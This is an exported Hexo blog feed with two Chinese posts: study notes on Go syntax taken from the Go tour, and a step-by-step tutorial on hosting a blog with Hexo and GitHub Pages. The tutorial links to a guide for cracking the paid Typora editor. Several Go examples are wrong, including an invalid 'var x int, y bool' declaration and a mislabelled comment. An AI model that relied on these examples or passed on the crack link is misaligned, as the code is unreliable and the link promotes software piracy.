      <url>/2024/11/11/Go%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="基于Go指南的个人总结"><a href="#基于Go指南的个人总结" class="headerlink" title="基于Go指南的个人总结"></a>基于Go指南的个人总结</h1><p>&emsp;&emsp;博主通过Go官网提供的<a href="https://tour.go-zh.org/">学习文档</a>进行Go语言的学习，并整理笔记，记录如下！</p><span id="more"></span><!-- toc --><h2 id="一、包、函数、变量、常量"><a href="#一、包、函数、变量、常量" class="headerlink" title="一、包、函数、变量、常量"></a>一、包、函数、变量、常量</h2><h4 id="1、包的导入与导出"><a href="#1、包的导入与导出" class="headerlink" title="1、包的导入与导出"></a>1、包的导入与导出</h4><p>&emsp;&emsp;<strong>包的导入</strong>：无论导入一个包还是多个包，为了便于后续再添加、更改，使用如下语法</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;package1&quot;</span>                <span class="comment">// 熟悉吗，Go的注释方法同C、C++一致</span></span><br><span class="line">    <span class="string">&quot;package2/package3&quot;</span>       <span class="comment">// 导入package2包中的package3子包</span></span><br><span class="line">    <span class="string">&quot;package4&quot;</span>                <span class="comment">// 导入package4</span></span><br><span class="line">    ····</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>包的导入</strong><span style="background-color: yellow;"> <strong>&gt; 注</strong></span>：导入的包必须使用，不使用则Go语言会报错 —-&gt; “包名” imported and not used</p><p>&emsp;&emsp;<strong>包的导出</strong>：在自定义包&#x2F;标准库中，如果你想让其他包访问某些函数、类型、变量或常量，你需要以大写字母开头来声明它们；在引用某一包中的元素时，需要增加包名作前缀以使程序识别</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;math/rand&quot;</span>               <span class="comment">// 导入math中的rand包，包名即为rand</span></span><br><span class="line">    <span class="string">&quot;fmt&quot;</span>                     <span class="comment">// 导入fmt包，包名即为fmt</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    fmt.Println(rand.Intn(<span class="number">100</span>))      <span class="comment">// 生成一个0到99之间的随机整数并输出</span></span><br><span class="line">    <span class="comment">// fmt.println(rand.Intn(100))   // 错误，因为能导出包的首字母均大写，引用包中属性时，也需要首字母大写</span></span><br><span class="line">    <span class="comment">// fmt.Println(math.Intn(100))   // 错误，前缀需为包名，故引用函数Intn()前应加rand</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2、函数定义"><a href="#2、函数定义" class="headerlink" title="2、函数定义"></a>2、函数定义</h4><p>&emsp;&emsp;<strong>函数基本结构：func ~1 ( ~2 ) ( ~3 ) { ~4 }</strong></p><p>&emsp;&emsp;~1：<strong>函数名</strong>，首字母大写与小写会导致函数是否能被导出</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Myfunction</span><span class="params">()</span></span> &#123;&#125;   <span class="comment">// 可以被外部程序导出并使用</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">()</span></span> &#123;&#125;   <span class="comment">// 只能在包内部才能被识别，外界无法使用</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;~2：<strong>参数列表</strong>，可以设置1或多个传入参数，也可以不设置参数；设置参数需要参数名与参数类型，参数名在参数类型前面</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">()</span></span> &#123;&#125;                     <span class="comment">// 不设置参数</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(x <span class="type">int</span>)</span></span> &#123;&#125;                <span class="comment">// 设置int型参数x</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(x <span class="type">int</span>, y <span class="type">int</span>)</span></span> &#123;&#125;         <span class="comment">// 设置int型参数x、y</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(x, y <span class="type">int</span>)</span></span> &#123;&#125;             <span class="comment">// 多个相同类型参数可以合并参数类型写于末尾</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(x <span class="type">int</span>, y <span class="type">string</span>)</span></span> &#123;&#125;      <span class="comment">// 设置int型参数x，string型参数y</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(x, y <span class="type">int</span>, z <span class="type">string</span>)</span></span> &#123;&#125;   <span class="comment">// 设置int型参数x、y，string型参数z</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;~3：<strong>返回值</strong>，可以设置一个或多个返回值，逗号分隔；(<span style="background-color: yellow;"> <strong>特色！</strong></span>:返回值也可以取名字，作用独特)</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> <span class="type">int</span> &#123;&#125;               <span class="comment">// 单个返回值或无返回值可以省略括号</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> (<span class="type">int</span>, <span class="type">string</span>) &#123;&#125;     <span class="comment">// 多返回值需对应一一点名类型</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> (<span class="type">int</span>, <span class="type">int</span>) &#123;&#125;        <span class="comment">// 多个相同类型返回值，类型不能省去(没有人会这么想吧我想)</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> (x, y <span class="type">int</span>) &#123;&#125;        <span class="comment">// 当然，当返回值取了名字，就不一样了，相同类型返回值可以合并</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;~3 &gt; <strong>特性</strong>：当返回值有名字后，被称为命名返回值或裸返回值，它们会被视作定义在函数顶部的变量，当函数使用的return语句不跟参数时，会自动返回这些特殊的返回值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 一般返回值：return语句后必须跟参数，逗号隔开，类型顺序对应</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> (<span class="type">int</span>, <span class="type">int</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> b, a</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 命名返回值、一般返回值不可混合使用</span></span><br><span class="line">：<span class="keyword">return</span>语句后允许不跟参数，自动按序返回命名返回值的值</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> (x, y <span class="type">int</span>) &#123;</span><br><span class="line">    <span class="comment">// 如果不对这些返回值赋值，它们会正常输出程序自动初始化的值，int型为0，string型为&quot;&quot;，bool型为false</span></span><br><span class="line">    <span class="comment">// 在返回值中声明命名返回值，等效为在函数开头将其视为变量声明，比如此例，即为下述两行：</span></span><br><span class="line">    <span class="comment">// x = 0</span></span><br><span class="line">    <span class="comment">// y = 0</span></span><br><span class="line">    <span class="keyword">return</span> </span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 当然你也可以声明命名返回值后在使用return时继续跟上对应参数，一旦return后跟上参数，参数必须同返回值数量、类型、顺序一致</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> (x, y <span class="type">int</span>, z <span class="type">string</span>) &#123;</span><br><span class="line">    x = <span class="number">1</span></span><br><span class="line">    y = <span class="number">2</span></span><br><span class="line">    z = <span class="string">&quot;China&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">2</span>, <span class="number">4</span>, <span class="string">&quot;Power&quot;</span>        <span class="comment">// 不会返回 1 2 China ，返回 2 4 Power</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 错误1：声明返回值后，函数体中必须使用return语句</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> (x, y <span class="type">int</span>) &#123;&#125;     <span class="comment">// 返回错误提示：missing return</span></span><br><span class="line"><span class="comment">// 错误2：命名返回值、一般返回值不可混合使用</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">myfunction</span><span class="params">(a <span class="type">int</span>, b <span class="type">int</span>)</span></span> (x <span class="type">int</span>, <span class="type">int</span>) &#123;    <span class="comment">// 返回错误提示：mixed named and unnamed parameters</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;~4：<strong>函数体</strong>，没啥好说的，注意声明返回值后，函数体中必须使用return语句即可</p><h4 id="3、变量声明"><a href="#3、变量声明" class="headerlink" title="3、变量声明"></a>3、变量声明</h4><p>&emsp;&emsp;<strong>声明区域</strong>：可以声明在包内或函数内，包级别声明的变量包内全局可被访问修改，而函数级别声明的变量只在函数体内有效</p><p>&emsp;&emsp;<strong>变量声明的一般方法</strong>：使用var语句可以声明一或多个变量，允许声明的类型、位置均不限，声明的格式为“ 变量名 变量类型”</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x <span class="type">int</span>, y <span class="type">bool</span>                     <span class="comment">// 每次声明的变量间逗号隔开，若没有在声明时赋值，则变量自动初始化为默认值</span></span><br><span class="line"><span class="keyword">var</span> x, y <span class="type">int</span>                          <span class="comment">// 当&quot;所有声明&quot;的变量均一致时，可以将变量类型合并置于末尾</span></span><br><span class="line"><span class="keyword">var</span> x, y = <span class="number">1</span>, <span class="literal">true</span>                    <span class="comment">// 懒人方法，当你声明变量时对其赋初始值时，可以不在声明时注明类型，程序自动推断</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>短变量声明</strong>：使用 :&#x3D; 短赋值语句可以为函数体级别的变量进行声明，语法为：变量名 :&#x3D; 初始值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">k := <span class="number">12</span>                       <span class="comment">// k被自动推断为int型</span></span><br><span class="line">a, b, c := <span class="number">1</span>, <span class="number">3.14</span>, <span class="string">&quot;China&quot;</span>   <span class="comment">// 当然，一次性可以声明一或多个变量</span></span><br><span class="line"><span class="comment">// 如果初始值是一变量，则自动认为是该变量的类型</span></span><br><span class="line"><span class="keyword">var</span> name <span class="type">string</span></span><br><span class="line">firstname := name             <span class="comment">// k被自动推断为string型</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>Go的变量类型</strong>：不报菜名了，<a href="https://tour.go-zh.org/basics/11">点这里☜</a></p><p>&emsp;&emsp;<strong>Go的变量类型</strong><span style="background-color: yellow;"> <strong>&gt; 注-1</strong></span>：int、uint、uintptr的位数同操作系统有关</p><p>&emsp;&emsp;<strong>Go的变量类型</strong><span style="background-color: yellow;"> <strong>&gt; 注-2</strong></span>：var语句可以一个代码块的方式声明变量，建议以后均使用此语法，便于添加、修改</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> (  </span><br><span class="line">    a <span class="type">int</span>    = <span class="number">1</span>  </span><br><span class="line">    b, c <span class="type">int</span> = <span class="number">2</span>, <span class="number">3</span>  </span><br><span class="line">    d        = <span class="number">4</span></span><br><span class="line">    e        = <span class="string">&quot;China&quot;</span></span><br><span class="line">    f <span class="type">string</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>类型转换</strong>：使用表达式T(v)，其中T为需转化为的变量类型，v为转化变量本身，使用该表达式不会对变量v本身造成影响</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>                    <span class="comment">// x声明为int型变量</span></span><br><span class="line"><span class="keyword">var</span> y = <span class="type">float32</span>(x)           <span class="comment">// 表达式返回一个float32型变量，其值为x，y通过初始化确定其类型也为float32</span></span><br><span class="line">z := <span class="type">float32</span>(x)              <span class="comment">// 短赋值语句也可以使用</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>类型转换</strong><span style="background-color: yellow;"> <strong>&gt; 注</strong></span>：不是任意变量的类型转换均可使用该表达式，这里特别指出与其余主流编程语言的不同，即字符串和数值无法互相转换，布尔型数据也无法和数值型变量互相转换</p><h4 id="4、常量声明"><a href="#4、常量声明" class="headerlink" title="4、常量声明"></a>4、常量声明</h4><p>&emsp;&emsp;<strong>声明区域</strong>：同变量声明机制完全相同</p><p>&emsp;&emsp;<strong>声明方法</strong>：常量的声明只能使用const关键字，不能使用 :&#x3D; 语句，且常量的声明必须初始化；常量的类型仅字符、字符串、布尔值或数值四种，其格式为：const 常量名 常量类型 &#x3D; 初始化值</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> x <span class="type">int</span> = <span class="number">1</span>                       <span class="comment">// x为int型常量1</span></span><br><span class="line"><span class="keyword">const</span> y, z <span class="type">int</span> = <span class="number">2</span>, <span class="number">2</span>                 <span class="comment">// 相同类型常量，其类型可合并</span></span><br><span class="line"><span class="keyword">const</span> p, q = <span class="number">3</span>, <span class="string">&quot;China&quot;</span>               <span class="comment">// 同样，由于进行了初始化，常量类型可不写明，但这我并不建议</span></span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>声明方法</strong><span style="background-color: yellow;"> <strong>&gt; 注</strong></span>：同var语句声明变量一样，const关键字也可以一个代码块的方式声明变量</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> (  </span><br><span class="line">    a    = <span class="number">1</span>  </span><br><span class="line">    b, c = <span class="number">2</span>, <span class="number">3</span>  </span><br><span class="line">    d    = <span class="string">&quot;China&quot;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>未指定类型常量的特点</strong>：一个未指定类型的常量由上下文来决定其类型，故建议声明时即显式确定其类型</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 比如，根据算术运算式确定类型</span></span><br><span class="line"><span class="keyword">const</span> a = <span class="number">1</span>  </span><br><span class="line"><span class="keyword">const</span> b = <span class="number">2.0</span>  </span><br><span class="line"><span class="keyword">const</span> c = a + b         <span class="comment">// c被推断为float64型，因为b是float64型，而a会被提升为float64运算</span></span><br></pre></td></tr></table></figure><h2 id="二、for、if、else、switch和defer"><a href="#二、for、if、else、switch和defer" class="headerlink" title="二、for、if、else、switch和defer"></a>二、for、if、else、switch和defer</h2><h4 id="1、for循环的多种用法"><a href="#1、for循环的多种用法" class="headerlink" title="1、for循环的多种用法"></a>1、for循环的多种用法</h4><p>&emsp;&emsp;<strong>一般结构：for ~1; ~2; ~3 { ~4}</strong></p><p>&emsp;&emsp;~1：<strong>变量声明初始化语句</strong>，可选，在进入循环之前定义，只能使用 :&#x3D; 语句，所定义的变量只存活于该for循环内</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> i := <span class="number">0</span>; i &lt; <span class="number">10</span>; i++ &#123; fmt.Println(i) &#125;         <span class="comment">// i被声明为0，可以被循环体中的fmt.Println(i)访问</span></span><br><span class="line">    <span class="comment">// for var i = 0; i &lt; 10; i++ &#123; fmt.Println(i) &#125;   // 错误，不可以使用var语句，返回报错：var declaration not allowed in for initializer</span></span><br><span class="line">    <span class="comment">// fmt.Println(i)                                  // 外界不可访问for中的i，返回报错：undefined: i</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;~2：<strong>进入循环条件表达式</strong>，可选，在每次循环开始前执行表达式，为真则进入循环</p><p>&emsp;&emsp;~3：<strong>后置语句</strong>，可选，在每次循环结束后执行一次</p><p>&emsp;&emsp;~4：<strong>循环体</strong>，可以为空，循环体中语句运行完即运行后置语句</p><p>&emsp;&emsp;<strong>作为while使用：for ~2 { ~4}</strong></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    i := <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i &lt; <span class="number">10</span> &#123; i += i &#125;       <span class="comment">// 等效于C++中的while (i &lt; 10) &#123; i += i;&#125;</span></span><br><span class="line">    fmt.Println(i)              <span class="comment">// 输出应为16</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>&emsp;&emsp;<strong>无限循环：for { ~4 }</strong>，慎用且一般不用或避免使用</p><h4 id="2、if判断语句"><a href="#2、if判断语句" class="headerlink" title="2、if判断语句"></a>2、if判断语句</h4><p>&emsp;&emsp;<strong>语句结构：if ~1; ~2 { ~3 }</strong></p>]]></content>
      
      
      <categories>
          
          <category> Programming Language Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Go </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>第一篇博客献给建博客的自己</title>
      <link href="/2024/10/20/%E5%88%A9%E7%94%A8Hexo%E5%92%8CGitHubPages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2024/10/20/%E5%88%A9%E7%94%A8Hexo%E5%92%8CGitHubPages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h1 id="利用Hexo和GitHub-Pages搭建个人博客"><a href="#利用Hexo和GitHub-Pages搭建个人博客" class="headerlink" title="利用Hexo和GitHub Pages搭建个人博客"></a>利用Hexo和GitHub Pages搭建个人博客</h1><p>&emsp;&emsp;博主在利用Hexo和GitHub Pages创建本博客网站时，几经波折得以建成，又几经波折得以发送出人生中第一篇博客。现将流程及所遇问题梳理如下，唯望前人栽树，后人乘凉。</p><span id="more"></span><!-- toc --><h2 id="1、预备工作"><a href="#1、预备工作" class="headerlink" title="1、预备工作"></a>1、预备工作</h2><p>&emsp;&emsp;环境准备：安装<span style="background-color: yellow;">Node.js</span>，用于使用npm包管理器，附官网 <a href="https://nodejs.org/en">https://nodejs.org/en</a></p><p>&emsp;&emsp;工具准备：安装<span style="background-color: yellow;">Git</span>，用于远程拉取和上传，附官网<a href="https://git-scm.com/">https://git-scm.com/</a></p><p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;安装<span style="background-color: yellow;">VsCode</span>，用于后期修改代码，附官网<a href="https://code.visualstudio.com/">https://code.visualstudio.com/</a></p><p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;安装<span style="background-color: yellow;">Typora</span>，用于更方便的编写Markdown文档，需收费，附官网<a href="https://typora.io/">https://typora.io/</a></p><p>&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;&emsp;(可以逃课，CSDN博主阿辉的日常：<a href="https://blog.csdn.net/qq_56746297/article/details/141232176?ops_request_misc=&request_id=&biz_id=102&utm_term=typora%E7%A0%B4%E8%A7%A3%E7%89%88%E5%AE%89%E8%A3%85%E6%95%99%E7%A8%8B&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~sobaiduweb~default-0-141232176.nonecase&spm=1018.2226.3001.4450">Typora2024最新版破解方法（博主亲测可用）</a>)</p><p>&emsp;&emsp;账号准备：注册<span style="background-color: yellow;">GitHub账号</span>，用来搭建仓库，附官网<a href="https://github.com/">https://github.com/</a></p><p>&emsp;&emsp;前置知识：知晓<span style="background-color: yellow;">Markdown语法</span>、有HTML基础会好</p><h2 id="2、初始化GitHub仓库"><a href="#2、初始化GitHub仓库" class="headerlink" title="2、初始化GitHub仓库"></a>2、初始化GitHub仓库</h2><p>&emsp;&emsp;创建GitHub仓库：进入自己的GitHub账号主页，在Repositories中找到“New”跳转到仓库创建页面</p><hr><p>&emsp;&emsp;<img src="/2024/10/20/%E5%88%A9%E7%94%A8Hexo%E5%92%8CGitHubPages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/%E5%88%9B%E5%BB%BA%E4%BB%93%E5%BA%93.png" title="创建仓库"></p><hr><p>&emsp;&emsp;如图进行填写勾选，<span style="background-color: red;">注</span>：Repository name处必须填“<span style="background-color: yellow;">账号名字.github.io</span>”</p><h2 id="3、初始化Hexo"><a href="#3、初始化Hexo" class="headerlink" title="3、初始化Hexo"></a>3、初始化Hexo</h2><p>&emsp;&emsp;[1]、在电脑选一个喜欢的位置，新建一个文件夹作为博客文件夹，比如博主的博客就建在：D:\Blog</p><p>&emsp;&emsp;[2]、该目录下点击上方地址栏，输入cmd，打开命令行窗口，输入以安装Hexo：<span style="background-color: yellow;">npm i hexo-cli -g</span></p><p>&emsp;&emsp;[3]、同样是该窗口，输入：<span style="background-color: yellow;">npm install</span>，下载依赖</p><p>&emsp;&emsp;[4]、安装完成后即可初始化Hexo：<span style="background-color: yellow;">hexo init</span></p><p>&emsp;&emsp;恭喜你，到这一步你已经可以在本地运行你的博客了，不要关闭命令行窗口，输入：<span style="background-color: yellow;">hexo s</span>看看成果</p><p>&emsp;&emsp;虽然很丑而且还不能远程访问，不过果子得一口口吃，都会有的</p><h2 id="4、实现远程部署"><a href="#4、实现远程部署" class="headerlink" title="4、实现远程部署"></a>4、实现远程部署</h2><p>&emsp;&emsp;这一步，我们要使自己的博客能够被远程访问，即通过网址让他人能看到你的博客，最终效果就是你可以在离我不知道多远的地方看我的文章๑乛◡乛๑</p><p>&emsp;&emsp;[1]、同样，我们不需要关闭命令行窗口(当然如果你关闭了，重新打开就是了)，输入：<span style="background-color: yellow;">ssh</span>，检查ssh是否可用</p><p>&emsp;&emsp;[2]、无异常后，输入两行代码，让Git知道你的GitHub账号信息：</p><p>&emsp;&emsp;<code>git config --global user.name &quot;GitHub账号名&quot; </code></p><p>&emsp;&emsp;<code>git config --global user.email &quot;GitHub账号注册邮箱&quot;</code></p><p>&emsp;&emsp;[3]、在本地创建ssh秘钥，输入：</p><p>&emsp;&emsp;<code>ssh-keygen -t rsa -C &quot;GitHub账号注册邮箱&quot;</code></p><p>&emsp;&emsp;程序会出现三次暂停等候输入，不用理会直接跳过。随后会出现如下界面：</p><hr><p>&emsp;&emsp;<img src="/2024/10/20/%E5%88%A9%E7%94%A8Hexo%E5%92%8CGitHubPages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/%E5%88%9B%E5%BB%BAssh%E5%AF%86%E9%92%A5.png" title="创建ssh密钥"></p><hr><p>&emsp;&emsp;[4]、完成后，根据上图第三行代码括号中路径，找到<span style="background-color: orange;">id_rsa.pub</span>文件，用记事本打开，复制密钥</p><p>&emsp;&emsp;[5]、来到GitHub个人主页，点击右上方个人账号头像，找到“Settings”，接着点击“SSH and GPG keys”</p><p>&emsp;&emsp;[6]、界面右侧会有绿色按钮“New SSH key”，点击，密钥名字任意，然后在“Key”处输入复制的密钥</p><p>&emsp;&emsp;[7]、密钥生成后，可以在原命令行窗口输入以检查是否有异：</p><p>&emsp;&emsp;<code>ssh git@github.com</code></p><p>&emsp;&emsp;密钥密钥，自然是保护用的，密钥生成使用后，GitHub便只允许本地有私钥文件的电脑进行内容推送，你的博客才不会被随意篡改</p><p>&emsp;&emsp;[8]、闲谈结束，接下来我们要让博客被推送到GitHub仓库中，首先下载必需插件：<span style="background-color: yellow;">npm install hexo-deployer-git –save</span></p><p>&emsp;&emsp;[9]、打开你的博客文件夹，找到<span style="background-color: orange;">_config.yml</span>文件，，用准备好的VsCode打开。这是博客的配置文件，之后的样式、文字、功能等修改都需要在此对代码进行修改</p><p>&emsp;&emsp;[10]、ctrl+快捷键搜索：<span style="background-color: yellow;">deploy</span>，并将此处代码修改为如下图示例：</p><hr><p>&emsp;&emsp;<img src="/2024/10/20/%E5%88%A9%E7%94%A8Hexo%E5%92%8CGitHubPages%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/%E4%BB%A3%E7%A0%81%E7%A4%BA%E8%8C%831.png" title="代码示范"></p><hr><p>&emsp;&emsp;显然，在“repo”这一行，大家应修改为：</p><p>&emsp;&emsp;<code>git@github.com:GitHub账号名/GitHub账号名.github.io.git</code></p><p>&emsp;&emsp;[11]、在原命令行窗口下，生成静态文件，输入：<span style="background-color: yellow;">hexo g</span></p><p>&emsp;&emsp;[12]、上传到GitHub，输入：<span style="background-color: yellow;">hexo d</span></p><p>&emsp;&emsp;如果你成功完成了上述十二步，现在是享受劳动成果的时候了，<span style="background-color: yellow;">https:&#x2F;&#x2F;账号名.github.io</span>，这就是专属于你的博客网址啦！&lt;(￣︶￣)&gt;</p><h2 id="5、使用更美观的主题（可选）"><a href="#5、使用更美观的主题（可选）" class="headerlink" title="5、使用更美观的主题（可选）"></a>5、使用更美观的主题（可选）</h2><p>&emsp;&emsp;有点丑，至少我是这么想的。来选个好看的主题吧，博主这里推荐Next主体和Butterfly主体，博主会以自身博客为例，讲解下载、使用Next主题。</p><p>&emsp;&emsp;[1]、打开GitHub，在搜索框搜索：<span style="background-color: yellow;">hexo next</span>，没错，这是GitHub大佬的杰作，点击“Code”，下载zip压缩包，解压到博客文件夹中的“theme”目录下</p><p>&emsp;&emsp;[2]、在博客文件夹目录的<span style="background-color: orange;">_config.yml</span>文件修改配置theme：</p><p>&emsp;&emsp;<code>theme: next</code></p><p>&emsp;&emsp;可以先在本地运行一下博客看看有没有成功更换主题，没忘吧•⌄•(忘了就参考第三板块倒数第二句)</p><p>&emsp;&emsp;[3]、当然，Next主体可更改的属性有很多，博主也还在学习怎么把博客变得更个性化，不过这不是有大佬嘛，推荐CSDN博主ywang_wnlo：<a href="https://blog.csdn.net/CoolBoySilverBullet/article/details/121719830?ops_request_misc=%257B%2522request%255Fid%2522%253A%25226298D213-4C23-421C-88C8-99A1DE4019D6%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=6298D213-4C23-421C-88C8-99A1DE4019D6&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~sobaiduend~default-1-121719830-null-null.nonecase&utm_term=hexonext&spm=1018.2226.3001.4450">【Hexo】NexT 